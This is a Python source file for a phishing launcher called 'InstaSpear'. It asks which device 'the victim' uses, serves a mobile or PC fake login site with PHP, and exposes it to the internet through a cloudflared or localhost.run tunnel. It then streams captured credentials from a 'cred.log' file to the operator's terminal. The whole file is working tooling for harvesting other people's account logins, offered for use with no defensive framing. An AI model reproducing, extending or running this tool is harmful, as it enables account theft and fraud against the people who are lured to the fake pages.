# Created by Mr-Robot-ctrl
#!/usr/bin/env python3
import subprocess
import time
import pathlib
import os
import shutil
import re
from pyfiglet import figlet_format
from termcolor import colored

# --- Configuration ---
SITES = {
    "1": ("Mobile", "mobile"),  # site1 folder
    "2": ("PC", "PC"),  # site2 folder
}
cwd = os.getcwd()  # current working directory
# LOG_FILE will be set after user selects the site

def show_banner():
    """Display banner with right-aligned signature"""
    banner = figlet_format("InstaSpear", font="slant")
    print(colored(banner, "cyan"))

    # Right-align the signature
    width = shutil.get_terminal_size().columns
    signature = "~ Mr-Robot-ctrl"
    print(colored(signature.rjust(width), "yellow"))
    print()

def start_php_server(site_dir, port):
    """Start PHP built-in server"""
    print(f"[*] Starting PHP server on port {port} for {site_dir}...")
    return subprocess.Popen(
        ["php", "-S", f"127.0.0.1:{port}", "-t", site_dir],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )


def start_cloudflared(port):
    """Start cloudflared tunnel"""
    print("[*] Starting Cloudflared tunnel...")
    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
    )
    url = None
    url_pattern = re.compile(r"https://[\w\-]+\.trycloudflare\.com")
    start_time = time.time()
    timeout = 30  # seconds
    for line in proc.stdout:
        match = url_pattern.search(line)
        if match:
            candidate = match.group(0)
            # Filter out the API endpoint
            if candidate != "https://api.trycloudflare.com":
                url = candidate
                break
        # Timeout if URL not found in time
        if time.time() - start_time > timeout:
            break
    if url:
        print(f"[+] Public URL: {url}")
    else:
        print("[!] Could not retrieve Cloudflared public URL. Check cloudflared output above.")
    return proc, url

def start_localhost_run(port):
    """Start localhost.run tunnel using SSH reverse tunnel"""
    print("[*] Starting localhost.run tunnel...")
    # The -N flag means no remote command, just forwarding
    # The -R 80:localhost:PORT forwards remote port 80 to local port
    # The output will contain the public URL
    proc = subprocess.Popen(
        ["ssh", "-o", "StrictHostKeyChecking=no", "-R", f"80:localhost:{port}", "localhost.run"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
    )
    url = None
    # Accept both .localhost.run and .lhr.life domains
    url_pattern = re.compile(r"https://[\w\-]+\.(localhost\.run|lhr\.life)")
    start_time = time.time()
    timeout = 30  # seconds
    output_lines = []
    for line in proc.stdout:
        output_lines.append(line)
        match = url_pattern.search(line)
        if match:
            candidate = match.group(0)
            if candidate != "https://admin.localhost.run":
                url = candidate
                break
        if time.time() - start_time > timeout:
            break

    # After extracting the URL, redirect further output to DEVNULL to avoid interference
    if url:
        print(f"[+] Public URL: {url}")
        # Reopen stdout to DEVNULL to silence further output
        proc.stdout.close()
        proc.stdout = open(os.devnull, 'w')
    else:
        print("[!] Could not retrieve localhost.run public URL. SSH output:")
        print(''.join(output_lines))
    return proc, url

def tail_log_file(path: str):
    """Continuously show new lines from log file"""
    log_path = pathlib.Path(path)
    last_size = 0
    print(f"[*] Watching {path} for new entries...")
    while True:
        if log_path.exists():
            new_size = log_path.stat().st_size
            if new_size > last_size:
                with log_path.open() as f:
                    f.seek(last_size)
                    print(f.read(), end="")
                last_size = new_size
        time.sleep(1)

def main():
    show_banner()

    # --- First menu: choose site ---
    print("\nWhich device does the victim use?:\n")
    for key, (name, _) in SITES.items():
        print(f"  [{key}] {name}")
    print()
    site_choice = input("Enter choice: ").strip()
    print()

    if site_choice not in SITES:
        print("[!] Invalid choice, exiting.\n")
        return

    site_name, site_dir = SITES[site_choice]
    os.makedirs(site_dir, exist_ok=True)

    # Set log file path based on selected site
    log_folder = os.path.join(cwd, site_dir)
    LOG_FILE = os.path.join(log_folder, "cred.log")

    # --- Ask for port ---
    port_input = input("\nEnter port number [default 8080]: ").strip()
    print()
    port = port_input if port_input else "8080"

    # --- Second menu: choose hosting method ---
    print("\nHow do you want to host it?\n")
    print("  [1] Localhost only")
    print("  [2] Cloudflared tunnel")
    print("  [3] Localhost.run tunnel\n")
    host_choice = input("Enter choice: ").strip()
    print()

    php_proc = start_php_server(site_dir, port)
    tunnel_proc = None
    url = f"http://127.0.0.1:{port}"

    # Add a blank line after server start
    print()

    if host_choice == "2":
        tunnel_proc, url = start_cloudflared(port)
        print()
    elif host_choice == "3":
        tunnel_proc, url = start_localhost_run(port)
        print()

    print(f"[+] {site_name} is running at: {url}\n")
    print("[CTRL+C to stop]\n")

    try:
        tail_log_file(LOG_FILE)
    except KeyboardInterrupt:
        print("\n[!] Shutting down...\n")
        php_proc.kill()
        if tunnel_proc:
            tunnel_proc.terminate()
            try:
                tunnel_proc.wait(timeout=5)
            except Exception:
                tunnel_proc.kill()

if __name__ == "__main__":
    main()
